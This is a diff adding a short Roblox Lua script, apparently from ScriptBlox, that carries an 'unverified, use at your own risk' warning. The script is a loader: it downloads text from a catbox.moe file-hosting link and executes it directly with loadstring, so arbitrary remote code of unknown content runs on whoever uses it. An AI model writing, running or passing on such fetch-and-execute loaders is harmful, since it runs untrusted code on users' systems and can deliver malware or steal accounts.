@@ -1,0 +1,17 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local HttpService = game:GetService("HttpService")
+
+local url = "https://files.catbox.moe/1ifhos.txt"
+
+local success, code = pcall(function()
+    return game:HttpGet(url)
+end)
+
+if success and code then
+    loadstring(code)()
+    print("LOADED")
+else
+    warn("Failed to download script")
+end
